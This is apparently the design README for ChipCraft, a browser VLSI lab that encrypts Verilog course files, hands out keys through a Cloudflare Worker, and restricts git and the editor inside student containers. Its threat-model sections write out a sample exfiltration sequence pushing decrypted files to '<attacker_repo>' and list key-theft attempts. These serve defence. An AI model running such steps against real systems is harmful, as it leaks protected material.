# ChipCraft Lab — How It Works

## Overview

ChipCraft is a browser-based VLSI lab platform. Students log in with GitHub, get a
private Linux desktop (XFCE + VNC) in their browser, and work with Verilog files
using Verilator, iverilog, and GTKWave — without installing anything locally.

The Verilog lab files are **encrypted at rest**. Students edit them in gvim, which
decrypts straight into the editor buffer and never writes a plaintext `.v` file to
disk — so `docker cp`, the terminal, or any other generic copy command only ever
finds ciphertext. Compiling is the one exception: `iverilog` is a separate process
that needs a real file, so `make` decrypts just-in-time and shreds the plaintext
the moment the compile step finishes — exposure measured in seconds, not the whole
session.

The encryption key is delivered via a **Cloudflare Worker** — it never appears as
an environment variable in the container, so `docker inspect` reveals nothing useful.

---

## GitHub Repositories

| Repo | URL | Purpose |
|---|---|---|
| `chipcraft-lab` | github.com/narrave/chipcraft-lab | Infrastructure — Dockerfile, API, entrypoint, tools |
| `chipcraft-lab-files` | github.com/narrave/chipcraft-lab-files | Lab files — encrypted `.v.enc` files + Makefile |
| `chipcraft-student` | github.com/narrave/chipcraft-student | VS Code Codespace launch only (devcontainer) |

> **`chipcraft-lab-files` is public** (files are encrypted so sharing them is safe).
> The API forks it into each student account on login (Server Mode).
> In Codespace/Docker Mode, students clone it directly.

---

## System Architecture

```
+--------------------------------------------------------------------------+
|  TEACHER'S PC                                                            |
|                                                                          |
|  counter.v  --encrypt-->  counter.v.enc  --push-->  chipcraft-lab-files |
|  (private)    encrypt_lab.sh   (safe to share)      github.com/narrave   |
+--------------------------------------------------------------------------+
                                                              |
                                              Cloned into ~/lab/ per student
                                                              |
+--------------------------------------------------------------------------+
|  SERVER  (docker compose up)                                             |
|                                                                          |
|  +------------------+        +---------------------------------------+   |
|  |  API Service     |        |  Student Container (one per student)  |   |
|  |  port 80         |        |                                       |   |
|  |                  |        |  ~/lab/            (git repo)         |   |
|  |  CHIPCRAFT_KEY   |<------>|    counter.v.enc   <- re-encrypted    |   |
|  |  in memory only  |one-time|    tb_counter.v.enc                   |   |
|  |                  | token  |    Makefile                           |   |
|  |  GitHub OAuth    |        |    mywork/         <- student .v files|   |
|  +------------------+        |                                       |   |
|                               |  ~/.chipcraft_key  (mode 600)         |   |
|                               |  gvim decrypts *.v.enc in memory      |   |
|                               |  (no plaintext .v file written)       |   |
|                               |                                       |   |
|                               |  ~/lab/build/  (tmpfs — `make` only, |   |
|                               |    used briefly, shredded right       |   |
|                               |    after iverilog compiles)           |   |
|                               |  Browser VNC desktop (noVNC 6080)    |   |
|                               +---------------------------------------+   |
+--------------------------------------------------------------------------+
                                       |
                                 Student's browser
                          (sees XFCE desktop via noVNC)
```

---

## Components

| File / Service | Repo | Role |
|---|---|---|
| `tools/encrypt_lab.sh` | chipcraft-lab | Teacher encrypts `.v` files on their PC |
| `tools/chipcraft-key-init.sh` | chipcraft-lab | Container — fetches the key once, writes `~/.chipcraft_key` (mode 600) |
| `tools/chipcraft-tree.sh` | chipcraft-lab | Container — decrypts/shreds a whole subtree on demand (session-scoped alternative; not required for `tarang2_dp1` day to day, see below) |
| `tools/chipcraft-decrypt-all.sh` | chipcraft-lab | Container — decrypts every `.enc` under `~/lab` into `~/lab/build` once at startup, persists for the whole session (deliberate tradeoff — see "Multi-file projects" below) |
| `tools/chipcraft-sweep.sh` | chipcraft-lab | Container — background watcher; encrypts `.v` in WORK and syncs to BUILD; encrypts user-created `.v` in BUILD to WORK |
| `tools/chipcraft-refresh-github-ips.sh` | chipcraft-lab | Installed as `/usr/local/bin/chipcraft-refresh-github` — re-fetches GitHub's current IP ranges and allowlists them in the egress firewall on demand, for when `git pull`/`clone`/`push` hangs because GitHub rotated an IP since container start |
| `tools/chipcraft-github-ssh-setup.sh` | chipcraft-lab | Installed as `/usr/local/bin/chipcraft-github-ssh-setup` — generates an SSH key if needed and uploads it to the student's own GitHub account via the API (clipboard is blocked, so pasting a key into GitHub's web UI isn't possible from inside the container) |
| `tools/chipcraft-vim-wrapper.sh` | chipcraft-lab | Installed as `/usr/local/bin/vi`, `vim`, `gvim` — silently redirects `*.v` args to `*.v.enc` so users cannot create raw `.v` files |
| `tools/chipcraft-crypt.vim` | chipcraft-lab | System-wide gvim plugin — decrypts/encrypts `*.v.enc` in memory, no plaintext file ever written |
| `tools/watermark.py` | chipcraft-lab | Embeds / reads invisible trailing-space watermark |
| `tools/detect_leak.sh` | chipcraft-lab | Teacher tool — identifies student from a leaked file |
| `tools/git-wrapper.sh` | chipcraft-lab | Installed as `/usr/local/bin/git` — blocks git outside `~/lab/` |
| `api/main.py` | chipcraft-lab | FastAPI — GitHub OAuth, container launch, key delivery |
| `router/app.py` | chipcraft-lab | Load balancer across student containers |
| `Dockerfile` | chipcraft-lab | Builds student desktop image (XFCE + VNC + Verilator) |
| `entrypoint.sh` | chipcraft-lab | Container startup — VNC, firewall, key fetch |
| `docker-compose.yml` | chipcraft-lab | Defines API service and build targets |
| `.env` | server only | Server-side secrets — never committed |
| `*.v.enc` | chipcraft-lab-files | Encrypted Verilog lab files |
| `mywork/` | chipcraft-lab-files | Student-created work (only `.v.enc` files — auto-encrypted on save) |
| `Makefile` | chipcraft-lab-files | `make` / `make wave` / `make clean` |
| `.gitignore` | chipcraft-lab-files | Blocks everything; only `*.enc` and repo infra files allowed |
| `.devcontainer/setup.sh` | chipcraft-student | Codespace startup — clones lab, fetches key, starts decrypt, registers pre-commit hook |
| `.devcontainer/devcontainer.json` | chipcraft-student | Codespace config — image, ports, postAttachCommand |
| `tools/pre-commit` | chipcraft-lab (image) | Git hook baked into Docker image at `/usr/local/lib/chipcraft-hooks/` — root-owned, students cannot edit |

---

## Deployment Options

Three ways to run ChipCraft. Choose based on your needs:

| | Codespace Mode | Local Docker Mode | Server Mode |
|---|---|---|---|
| **What runs where** | Student's own Codespace | Student's own laptop/PC | VPS / cloud server |
| **Cost** | Free (GitHub Codespaces) | Free (Docker Desktop) | ~$4-6/month |
| **Key hidden from students?** | Yes — via Cloudflare Worker | Yes — key only in Cloudflare | Yes — never in student env |
| **Setup time** | 10 minutes | 10 minutes | 30 minutes |
| **Best for** | Quick classes, no local installs | Small groups, offline use | Real lab, best security |
| **Requires internet** | Yes | Only to pull image and fetch key | Yes |

---

## Encryption — Teacher Side

### The Key

The encryption key is an AES-256 passphrase set by the teacher.
It lives in **two places only**:

1. The teacher's terminal (`CHIPCRAFT_KEY` env var) when encrypting
2. Cloudflare Worker secrets (delivers key at runtime, hidden from all students)

It is **never** stored in:
- The Docker image
- Any GitHub repository
- The student container's environment

### Encrypting Files

```bash
# On teacher's PC (Git Bash / WSL / Mac / Linux)
export CHIPCRAFT_KEY="your-secret-key"

# Encrypt a single file
bash NVR/tools/encrypt_lab.sh counter.v
# -> counter.v.enc

# Encrypt all .v files in a folder at once
bash NVR/tools/encrypt_lab.sh labs/
```

`encrypt_lab.sh` uses **AES-256-CBC with PBKDF2** (openssl):

```
openssl enc -aes-256-cbc -pbkdf2 -salt -k "$KEY" -in counter.v -out counter.v.enc
```

### Pushing Encrypted Files to chipcraft-lab-files

Only encrypted files go to GitHub. The `.gitignore` blocks everything except `.enc` files:

```
*            <- block everything by default
!.gitignore  <- allow repo infrastructure
!Makefile
!*.enc       <- the only data files allowed are encrypted Verilog
```

```bash
cd chipcraft-lab-files
cp ../labs/*.v.enc .
git add *.v.enc
git commit -m "lab1: counter"
git push
```

---

## Key Delivery — How the Container Gets the Key

The key is delivered via one of four methods, tried in order:

```
Priority 1 — Server Mode (API bootstrap token)
  Container calls  POST http://api:8000/lab-key  with BOOTSTRAP_TOKEN
  API validates the one-time token and returns CHIPCRAFT_KEY

Priority 2 — Codespace / Local Docker (Cloudflare Worker)
  setup.sh or chipcraft-key-init.sh sends CLASS_TOKEN to Cloudflare Worker
  Worker validates CLASS_TOKEN and returns CHIPCRAFT_KEY
  CHIPCRAFT_KEY is never stored in any environment variable —
  chipcraft-key-init.sh writes it straight to ~/.chipcraft_key (mode 600)

Priority 3 — Codespace fallback (CHIPCRAFT_KEY direct env var)
  If CHIPCRAFT_KEY is set as a Codespace secret, chipcraft-key-init.sh reads it

Priority 4 — Development / testing (LAB_KEY env var)
  If LAB_KEY is set locally, use it for local testing
```

---

## Cloudflare Worker — Hiding the Key

In **Codespace Mode** and **Local Docker Mode**, the key is delivered via a
free **Cloudflare Worker** instead of a local API server.

### Why it is needed

In Local Docker Mode, anyone can run `docker inspect <container>` and see all
environment variables — including secrets passed with `-e`. The Cloudflare
Worker prevents this by keeping `CHIPCRAFT_KEY` out of the container entirely.

### How it works

```
Teacher sets two secrets in Cloudflare dashboard:
  CLASS_TOKEN   = vlsi2026    <- shared with students (door pass, not the key)
  CHIPCRAFT_KEY = your-key    <- never shared (real encryption key)

Student container has CLASS_TOKEN in its environment:
  (visible in docker inspect, but harmless — it is just a door pass)

When chipcraft-key-init.sh needs the key:
  POST https://chipcraft-key.nagajyothibonthagorla.workers.dev
  Body: { "class_token": "vlsi2026", "user": "student_github_name" }

Worker checks CLASS_TOKEN:
  Match    -> returns { "key": "your-key" }
  No match -> returns 401 Unauthorized

CHIPCRAFT_KEY never leaves Cloudflare.
Students can only ever see CLASS_TOKEN (the door pass, not the vault).
```

### Cloudflare Worker code

```javascript
export default {
  async fetch(request, env) {
    if (request.method !== "POST") return new Response("Not allowed", { status: 405 });
    let body;
    try { body = await request.json(); }
    catch { return new Response("Bad request", { status: 400 }); }
    const { class_token, user } = body;
    if (!class_token || class_token !== env.CLASS_TOKEN)
      return new Response("Unauthorized", { status: 401 });
    console.log(`Key issued to: ${user}`);
    return Response.json({ key: env.CHIPCRAFT_KEY });
  }
};
```

### Setting up the Worker (teacher does once)

```
1. Go to cloudflare.com -> Workers & Pages -> Create application
2. Choose "Start with Hello World" -> name it chipcraft-key -> Deploy
3. Open the worker -> Edit code -> paste the code above -> Deploy
4. Go to Settings -> Variables and Secrets -> Add:
     CLASS_TOKEN   = vlsi2026        (give this to students)
     CHIPCRAFT_KEY = your-key        (keep this to yourself)
5. Update WORKER_URL in:
     NVR/tools/chipcraft-key-init.sh
     chipcraft-student/.devcontainer/setup.sh
```

---

## Server Mode — Key Delivery Step by Step

```
1. Teacher sets CHIPCRAFT_KEY in .env on server

2. docker compose up  ->  API container reads CHIPCRAFT_KEY into memory

3. Student logs in via GitHub OAuth

4. API forks chipcraft-lab-files -> student GitHub account
   API clones student fork       -> ~/lab/ inside the container

5. API generates BOOTSTRAP_TOKEN (32 random bytes, expires in 30 seconds)
   API launches student container with BOOTSTRAP_TOKEN only
   (CHIPCRAFT_KEY is NOT passed to the student container)

6. Container starts -> chipcraft-key-init.sh runs

7. chipcraft-key-init.sh calls:
   POST http://api:8000/lab-key  { "token": "<BOOTSTRAP_TOKEN>" }
   (over internal Docker network — not reachable from student browser)

8. API validates: IP check + not expired + single-use

9. API returns CHIPCRAFT_KEY; chipcraft-key-init.sh writes it to
   ~/.chipcraft_key (mode 600, owned by ubuntu); BOOTSTRAP_TOKEN immediately
   unset from environment

10. Student opens ~/lab/counter.v.enc in gvim. The chipcraft-crypt.vim plugin
    reads ~/.chipcraft_key, pipes the buffer through openssl, embeds the
    invisible watermark — all inside the editor buffer. No plaintext .v file
    is written to disk.

11. Student edits in gvim; `:w` pipes the buffer back through openssl and
    overwrites ~/lab/counter.v.enc directly.
```

### Why students cannot steal the key

| Attack | Blocked because |
|---|---|
| `env` in terminal | BOOTSTRAP_TOKEN already consumed and unset; CHIPCRAFT_KEY was never there |
| `curl http://api:8000/lab-key` | Token already used — returns 401 |
| Copy `.v.enc` file and decrypt | They do not have the key |
| Read `.env` file | On the server — not inside the container |
| `docker inspect api` | Requires Docker daemon access — students do not have it |
| `cat ~/.chipcraft_key` | **Not blocked** — same Linux user as gvim, so the key is readable by design. The point of this file is keeping the key off `env`/`docker inspect`, not hiding it from the student's own shell — that's structurally impossible once the same user must decrypt their own files. |

---

## Decryption — Inside the Container

There are two separate decrypt paths now: **editing** (gvim, always in-memory)
and **compiling** (`make`, which needs a real file for `iverilog` to read).

### Editing — gvim, in memory, no plaintext file ever

`chipcraft-key-init.sh` runs once at container startup and writes the key to
`~/.chipcraft_key` (mode 600). The `chipcraft-crypt.vim` plugin (loaded
system-wide for every user) hooks `*.v.enc` files:

```
Student runs:  gvim ~/lab/counter.v.enc
         |
         |  BufReadCmd fires — plugin reads ~/.chipcraft_key
         |  openssl enc -d -k "$KEY"   (piped straight into the buffer)
         |  watermark.py encode "@github_user"
         v
Plaintext exists only inside gvim's buffer.
swapfile / backup / undofile are disabled for this buffer — Vim itself
never spills it to disk either.

Student edits, then :w
         |
         |  BufWriteCmd fires — buffer piped through openssl
         v
~/lab/counter.v.enc   (overwritten directly — no intermediate plaintext file)
```

New designs work the same way — `gvim ~/lab/mywork/my_adder.v.enc` on a
filename that doesn't exist yet creates it; `:w` encrypts straight to that path.

### Compiling — decrypt just-in-time, shred immediately

`iverilog`/`vvp`/`gtkwave` are separate processes; they can only read real
files. `make` (in `chipcraft-lab-files/Makefile`) bridges this gap with the
smallest possible exposure window:

```
make / make wave / make run FILE=counter
         |
         |  _decrypt: openssl enc -d -k "$(cat ~/.chipcraft_key)"
         v
~/lab/build/*.v   (tmpfs — exists only for the few seconds iverilog runs)
         |
         |  iverilog -o sim.vvp *.v
         v
~/lab/build/sim.vvp   (compiled bytecode — kept)
         |
         |  _shred: shred -u ~/lab/build/*.v   (runs even if compile failed)
         v
~/lab/build/*.v no longer exists — only the compiled .vvp and any .vcd remain
```

### Multi-file projects — chipcraft-decrypt-all (e.g. tarang2_dp1)

Some lab content isn't a single-file `make` away from compiling — `tarang2_dp1`
is a full 8051-style CPU core with its own Perl/bash-driven build and
regression scripts (`compile.pl`, `regress.pl`, `bash_proj`, …), which are
themselves encrypted and need a whole subtree of real files, at their real
relative paths, coexisting on disk at once. Neither gvim (one file, in
memory) nor the `Makefile` (one flattened batch, for `iverilog`) covers that.

**`chipcraft-decrypt-all.sh` decrypts every `*.enc` under `~/lab` into
`~/lab/build` once, automatically, at container startup — and leaves it
there for the whole session.** No manual step, no exit-to-shred. This is a
**deliberate security tradeoff, not an oversight**: it restores the same
shape as the original always-decrypted model this project moved away from
earlier in its design, chosen specifically to remove the start/work/exit
friction that the previous session-scoped tool (`chipcraft-tree`) required
for multi-file projects like this one.

Concretely, this means:
```bash
cd ~/lab/build/tarang2_dp1/tarang/verilator/
bash ../scripts/bash_proj
perl ../scripts/compile.pl
perl ../scripts/regress.pl -r
```
— works immediately, every session, no `chipcraft-tree shell`/`exit` dance.

**What this costs**: `tarang2_dp1`'s real plaintext source sits on disk in
`~/lab/build` for the *entire container lifetime*, not just during a brief
compile or an explicitly-open session. `docker cp`, the terminal, or any
other filesystem access can read it at any time. This is the same exposure
the rest of this document describes closing for the simple `counter.v` lab
(via `make`'s decrypt-compile-shred) and for editing (via gvim's in-memory
model) — those two are unaffected by this change and remain narrow-window/
in-memory only. Only the bulk multi-file-project content in `build` is
now persistently decrypted.

`chipcraft-tree` (`shell`/`start`/`stop`) still exists and still works
exactly as before, for anyone who wants session-scoped decrypt/shred for a
specific subtree instead of relying on the startup bulk-decrypt — it's just
no longer required for `tarang2_dp1` day to day.

### Blocking .v file creation — vim wrapper

`vi`, `vim`, and `gvim` in `/usr/local/bin/` are replaced by a ChipCraft
wrapper (`chipcraft-vim-wrapper.sh`) that sits in front of the real binaries:

```
Student runs:  vi test.v      (or gvim, vim)
                    |
                    | wrapper intercepts — any *.v argument → *.v.enc
                    v
              vi test.v.enc   (opens the encrypted version)
                    |
                    | chipcraft-crypt.vim plugin decrypts in memory
                    v
              Editor shows plaintext Verilog — file on disk stays .v.enc
```

This means `vi test.v` **never creates a `.v` file** — it opens (or creates)
`test.v.enc` instead. Other arguments pass through unchanged: options, `.vh`
headers, `.vcd` waveforms, etc.

### Catching stray plaintext from touch / cp / mv

`chipcraft-sweep.sh` runs two layers in the background:
- **inotify** (`close_write`, `moved_to`) — reacts within milliseconds
- **Full-tree poll every 5 seconds** — backstop for events inotify misses
  (e.g. `cp -r` flooding a new directory before its watch is registered)

The sweep watches both `$WORK` and `$BUILD` and handles every case:

| File that appears | What sweep does |
|---|---|
| **`.v` in WORK** | Encrypt → `.enc` in WORK · Copy `.v` to BUILD (read-only) · Shred original |
| **`.enc` in WORK** | Lock read-only · Decrypt → `.v` in BUILD (read-only) |
| **`.enc` in BUILD** | Decrypt → `.v` in BUILD · Move `.enc` to WORK · Lock both |
| **`.v` in BUILD, no matching `.enc` in WORK** | Encrypt → `.enc` in WORK · Lock `.v` in BUILD read-only |
| **`.v` in BUILD, matching `.enc` exists in WORK** | Re-lock read-only (legitimate decrypted copy — no re-encrypt needed) |

So no matter how a `.v` file lands — `touch`, `cp`, `mv`, `docker cp` — it is
converted to a properly tracked `.enc` in WORK (with a read-only decrypted copy
in BUILD) within seconds.

Same residual limit as everywhere else: there's an unavoidable race between
"file appears" and either layer reacting. A read happening in that exact
instant can't be prevented by anything running inside the container.

### tmpfs — why it still matters

`/home/ubuntu/lab/build` is still a **RAM-only filesystem** (tmpfs, 2 GB ceiling — sized for Verilator builds, not just iverilog), nested
inside `~/lab` rather than a sibling folder — one directory for students to
think about, not two confusingly-similar names.

Its role differs by what put content there. For the simple `counter.v` lab,
`make`'s decrypt-compile-shred keeps it narrow: plaintext `.v` source exists
only for the duration of one compile, and compiled `.vvp`/`.vcd` output (not
readable source) is what persists between builds. For multi-file projects
like `tarang2_dp1`, `chipcraft-decrypt-all.sh` decrypts everything into here
once at startup and leaves it for the whole session — real plaintext source,
not just compiled output, persisting the entire time. See "Multi-file
projects" above for why that tradeoff was chosen.

**`noexec` gotcha (Codespaces specifically):** `devcontainer.json`'s `mounts`
property uses Docker's newer `--mount` API, which applies `nosuid,nodev,noexec`
as secure-by-default tmpfs options — and that API doesn't expose a way to
override `exec` (only `tmpfs-size`/`tmpfs-mode` are supported through it). A
Verilator-compiled binary sitting in `build/` would fail with "Permission
denied" even though its own file permissions (`-rwxr-xr-x`) are completely
correct — the filesystem itself was blocking execution, not the file. Fixed
by switching to `runArgs` with the legacy `--tmpfs` flag instead, which
doesn't default to `noexec`:
```json
"runArgs": ["--tmpfs", "/home/ubuntu/lab/build:rw,exec,size=2g,uid=1000,gid=1000,mode=0700"]
```
Server Mode (`api/main.py`'s `tmpfs={}` via docker-py) and the documented
Local Docker Mode `--tmpfs` flag already use this legacy mechanism, so
neither needed a change — this was specific to Codespaces' `mounts` property.

### Which files get re-encrypted on save

Every `:w` in gvim re-encrypts. Teacher files update their existing `.enc` in
`~/lab/`; student-created new files are saved directly to `~/lab/mywork/`.

| File opened in gvim | `~/lab/*.v.enc` exists? | `:w` writes to |
|---|---|---|
| `~/lab/counter.v.enc` (teacher lab file) | Yes | `~/lab/counter.v.enc` |
| `~/lab/tb_counter.v.enc` (teacher lab file) | Yes | `~/lab/tb_counter.v.enc` |
| `~/lab/mywork/my_adder.v.enc` (student new file) | No | `~/lab/mywork/my_adder.v.enc` (created) |
| `~/lab/mywork/seq_circuit.v.enc` (student new file) | No | `~/lab/mywork/seq_circuit.v.enc` (created) |

---

## SSH Key Setup (Inside the Container)

The clipboard is blocked (`-noclipboard`) so you cannot copy the public key from
the terminal to your host browser directly. Use `curl` to add the key to GitHub
via the API instead — GitHub HTTPS is whitelisted by the egress firewall.

### Quick way — `chipcraft-github-ssh-setup`

Wraps steps 1-3 below into one command: generates an ed25519 key if one
doesn't already exist, uploads it to your GitHub account, and verifies it.

```bash
chipcraft-github-ssh-setup <GITHUB_PERSONAL_TOKEN> ["key title"]
```

Needs a Personal Access Token with the `write:public_key` scope — see Step 2
below for where to create one. The manual steps are below for reference.

### Step 1 — Generate the key

```bash
ssh-keygen -t ed25519 -C "his_email@example.com"
# Press Enter three times to accept defaults (no passphrase)
```

### Step 2 — Add to GitHub via API

```bash
curl -X POST \
  -H "Authorization: token GITHUB_PERSONAL_TOKEN" \
  -H "Content-Type: application/json" \
  https://api.github.com/user/keys \
  -d "{\"title\":\"ChipCraft Lab\",\"key\":\"$(cat ~/.ssh/id_ed25519.pub)\"}"
```

Replace `GITHUB_PERSONAL_TOKEN` with a token that has the `write:public_key`
scope — create one at **github.com → Settings → Developer settings →
Personal access tokens → Tokens (classic) → New token**.

### Step 3 — Verify it worked

```bash
ssh -T git@github.com
# Hi username! You've successfully authenticated...
```

### What's allowed / blocked inside the container

| Command | Status |
|---|---|
| `ssh-keygen` | **Allowed** — `openssh-client` is installed |
| `cat ~/.ssh/id_ed25519.pub` | **Allowed** |
| `curl` to GitHub API | **Allowed** — GitHub IPs whitelisted |
| `ssh git@github.com` | **Allowed** — GitHub SSH port 22 whitelisted |
| Copy key via noVNC clipboard | **Blocked** — `-noclipboard` is set |
| `curl` to any other site | **Blocked** — egress firewall |

---

## Git Wrapper — Security Restriction

The Docker image installs a **git wrapper at `/usr/local/bin/git`** that sits in
front of the real git binary. This prevents students from pushing decrypted files
outside the lab repository.

### What the wrapper blocks

| Command | From where | Result |
|---|---|---|
| `git init` | Anywhere | Blocked — `[ChipCraft] git init is not allowed in this lab.` |
| `git clone` | Anywhere | Blocked — `[ChipCraft] git clone is not allowed in this lab.` |
| `git add` / `git commit` / `git push` | Outside `~/lab/` | Blocked — `[ChipCraft] git is only allowed inside ~/lab/.` |
| `git add counter.v` (plain `.v`) | Inside `~/lab/` | Silently ignored by `.gitignore` |
| `git add -f counter.v` then `git commit` | Inside `~/lab/` | Blocked by pre-commit hook (baked in image, read-only) — `COMMIT BLOCKED: only .enc files may be added` |
| `git add counter.v.enc` | Inside `~/lab/` | Allowed — encrypted file |
| `git commit` / `git push` with only `.enc` files | Inside `~/lab/` | Allowed — normal workflow |
| All other commands (log, diff, status…) | Anywhere | Allowed |

### Without the wrapper, a student could

```bash
cd ~/lab/build              # decrypted files briefly live here during `make`
                              # (git wrapper's "outside ~/lab" check doesn't help here —
                              #  .gitignore + the pre-commit hook are what actually block this)
git init                    # creates a new repo
git add counter.v           # stages the decrypted file
git commit -m "stolen"
git push <attacker_repo>    # sends plaintext to their personal repo
```

With the wrapper, `git init` exits immediately with an error.

### Pre-commit hook — not editable by students

`setup.sh` registers `~/lab` to use the hook baked into the image:

```bash
/usr/bin/git -C "$HOME/lab" config core.hooksPath /usr/local/lib/chipcraft-hooks
```

The hook file is at `/usr/local/lib/chipcraft-hooks/pre-commit` — owned by root,
not writable by the `ubuntu` user. Students cannot modify or delete it.

### Internal tools bypass the wrapper

`setup.sh` and `chipcraft-key-init.sh` call `/usr/bin/git` directly (not the wrapper)
so that automated cloning and pushing of encrypted files works correctly.

---

## Student Workflow

### Codespace Mode

```
1. Teacher gives you CLASS_TOKEN (e.g. vlsi2026)
2. Open github.com/narrave/chipcraft-student
3. Click Code -> Open in Codespace
4. Wait ~2 minutes for the container to start
5. The XFCE desktop opens automatically in your browser (port 6080)
6. Open terminal -> cd ~/lab && gvim counter.v.enc   (edits in place, in memory)
7. To compile/simulate: cd ~/lab && make
```

How setup.sh works when you attach:

```
postAttachCommand fires (runs AFTER Codespace secrets are injected):
  |
  +-- git clone chipcraft-lab-files -> ~/lab/
  |
  +-- Runs chipcraft-key-init.sh:
  |     -> Sends CLASS_TOKEN to Cloudflare Worker
  |     -> Worker validates CLASS_TOKEN, returns CHIPCRAFT_KEY
  |     -> Writes key to ~/.chipcraft_key (mode 600) — not kept in env
  |
  +-- gvim now decrypts/encrypts *.v.enc files transparently, in memory
```

> **postAttachCommand** is used (not postStartCommand) because Codespace secrets
> are only available after the user attaches, not during container start.

### Local Docker Mode

```bash
docker stop chipcraft-lab && docker rm chipcraft-lab
docker pull ghcr.io/narrave/chipcraft:v1.0
docker run -d \
  --name chipcraft-lab \
  --cap-add=NET_ADMIN \
  -p 6080:6080 \
  -e CLASS_TOKEN=vlsi2026 \
  -e GITHUB_USER=your_github_name \
  --tmpfs /workspaces/projects/build:size=2g,uid=1000,gid=1000,mode=0700 \
  ghcr.io/narrave/chipcraft:v1.0
# Open http://localhost:6080 in your browser
```

- `--cap-add=NET_ADMIN` is required for the egress firewall (iptables inside the container)
- `--tmpfs /workspaces/projects/build` mounts the decrypted-files directory as RAM-only
- Replace `v1.0` with `latest` if you want the bleeding-edge development build

2g, not 100m: `chipcraft-tree`'s Verilator builds (precompiled headers, object
files for a full RTL project) need much more scratch space than a single
`iverilog` compile of one file ever did. tmpfs is a ceiling, not a
reservation — it only consumes RAM as data is actually written.

The `--tmpfs` flag is required — without it, `~/lab/build` (used briefly during
`make` to hold plaintext just long enough for `iverilog` to compile) would
be a normal directory on the container's writable disk layer instead of
RAM-only, the same way it already is in Server Mode.

`entrypoint.sh` clones `chipcraft-lab-files` into `~/lab` automatically on
first start (only when `BOOTSTRAP_TOKEN` isn't set, i.e. not Server Mode) —
no manual clone step needed. `CLASS_TOKEN` is already present at container
start (passed via `-e`), so the key fetch succeeds immediately, unlike
Codespace Mode where it has to wait for `postAttachCommand`.

The container fetches the key from the Cloudflare Worker using CLASS_TOKEN.

### Edit (all modes)

```bash
# Open an existing encrypted lab file — plugin decrypts into buffer
gvim /workspaces/projects/.build.enc/counter.v.enc

# Or use the shortcut — vi/vim/gvim wrappers redirect .v to .v.enc automatically
gvim counter.v          # → actually opens counter.v.enc (no .v file created)

# :w re-encrypts straight back to the .enc file
:w

# Read-only decrypted copies are always in BUILD for simulation:
ls /workspaces/projects/build/
```

### Compile and simulate (all modes)

```bash
cd ~/lab                 # or chipcraft-lab-files checkout
make              # decrypts to tmpfs just-in-time, compiles, shreds plaintext immediately
make wave         # same, + opens GTKWave
make clean        # remove build outputs (compiled .vvp/.vcd only)
```

### Save lab work to GitHub

```bash
cd ~/lab
git add *.v.enc
git commit -m "lab1 solution"
git push
```

### Save your own files (mywork/)

```bash
# Create and edit a new design directly as an encrypted file
cd ~/lab/mywork
gvim my_adder.v.enc     # new filename — :w creates it, encrypted, in mywork/

# Commit the encrypted version to GitHub
cd ~/lab
git add mywork/my_adder.v.enc
git commit -m "my adder design"
git push
```

Student-created files live directly in `~/lab/mywork/*.v.enc` — there's no
intermediate plaintext copy to auto-encrypt, since gvim never created one.
Only `.enc` files can be committed — the pre-commit hook blocks any plain `.v` or other file type.
The hook lives in the Docker image at `/usr/local/lib/chipcraft-hooks/pre-commit` (root-owned) so students cannot edit or delete it.

---

## Server Setup (Teacher)

### 1. Create `.env` on the server

```bash
# NVR/.env   (never commit this file)
CHIPCRAFT_KEY=your-secret-key-here
GH_CLIENT_ID=your_github_oauth_app_id
GH_CLIENT_SECRET=your_github_oauth_secret
VNC_PASSWORD=novnc
TEMPLATE_REPO=narrave/chipcraft-lab-files
SESSION_TTL=14400
PORT_START=6081
PORT_END=6180
```

### 2. Get the Docker image (GitHub Actions builds it automatically)

Every push to `master` that touches `Dockerfile`, `entrypoint.sh`,
`tools/chipcraft-key-init.sh`, or `tools/chipcraft-crypt.vim` triggers **GitHub Actions -> Publish Docker Image**
which builds and pushes `ghcr.io/narrave/chipcraft:latest` automatically.

```bash
docker pull ghcr.io/narrave/chipcraft:latest
docker tag ghcr.io/narrave/chipcraft:latest ubuntu-novnc:latest
cd NVR
docker compose up -d
```

To roll out a new image after a code push:

```bash
docker pull ghcr.io/narrave/chipcraft:latest
docker tag  ghcr.io/narrave/chipcraft:latest ubuntu-novnc:latest
# New student containers will use the updated image automatically.
```

### 3. Encrypt and push lab files

```bash
export CHIPCRAFT_KEY="your-secret-key-here"
bash NVR/tools/encrypt_lab.sh counter.v
bash NVR/tools/encrypt_lab.sh tb_counter.v

cd chipcraft-lab-files
cp ../counter.v.enc ../tb_counter.v.enc .
git add *.v.enc
git commit -m "lab1: counter"
git push
```

---

## Codespace Setup (Teacher)

```bash
# 1. Deploy Cloudflare Worker (see Cloudflare section above)
#    Set CLASS_TOKEN and CHIPCRAFT_KEY as Worker secrets

# 2. Set Codespace secret  (CLASS_TOKEN only — NOT CHIPCRAFT_KEY)
#    github.com/settings/codespaces -> New secret
#    Name: CLASS_TOKEN  Value: vlsi2026  Repo: chipcraft-student

# 3. Encrypt lab files
export CHIPCRAFT_KEY="your-key"
bash NVR/tools/encrypt_lab.sh counter.v
cp counter.v.enc chipcraft-lab-files/
cd chipcraft-lab-files && git add *.v.enc && git commit -m "lab1" && git push

# 4. Make chipcraft-lab-files PUBLIC
#    github.com/narrave/chipcraft-lab-files -> Settings -> Change visibility -> Public

# 5. Invite students to chipcraft-student as collaborators
#    github.com/narrave/chipcraft-student -> Settings -> Collaborators
```

---

## File Layout Inside the Container

```
/workspaces/projects/
|
+-- .build.enc/                 <- WORK: git repo (persistent, encrypted at rest)
|   +-- counter.v.enc           <- re-encrypted by gvim on every :w
|   +-- tb_counter.v.enc
|   +-- rtl/
|   |   +-- alu.v.enc
|   +-- Makefile
|   +-- .gitignore              <- blocks all files; only *.enc allowed
|   (ALL files here are read-only, 444. Dirs are writable so gvim/sweep can add .enc files)
|
+-- build/                      <- BUILD: tmpfs (RAM only, vanishes when container stops)
    +-- counter.v               <- read-only decrypted copy (written by decrypt process)
    +-- tb_counter.v            <- read-only decrypted copy
    +-- rtl/
    |   +-- alu.v               <- read-only decrypted copy
    +-- sim.vvp                 <- generated by iverilog (compiled bytecode)
    +-- counter.vcd             <- generated by simulation, opened in GTKWave
    (ALL files here are read-only, 444. Dirs readable+executable, not writable)

/home/ubuntu/
+-- .chipcraft_key              <- decryption key, mode 600 (read by gvim plugin)
```

**Paths available as environment variables in every script and the vim plugin:**

```bash
WORK=/workspaces/projects/.build.enc    # encrypted source (git repo)
BUILD=/workspaces/projects/build        # decrypted read-only copies (tmpfs)
```

---

## File Exfiltration — Possible Attack Paths

| Attack method | Blocked? | How |
|---|---|---|
| **noVNC clipboard** copy | Blocked | `-noclipboard` on Xvnc server |
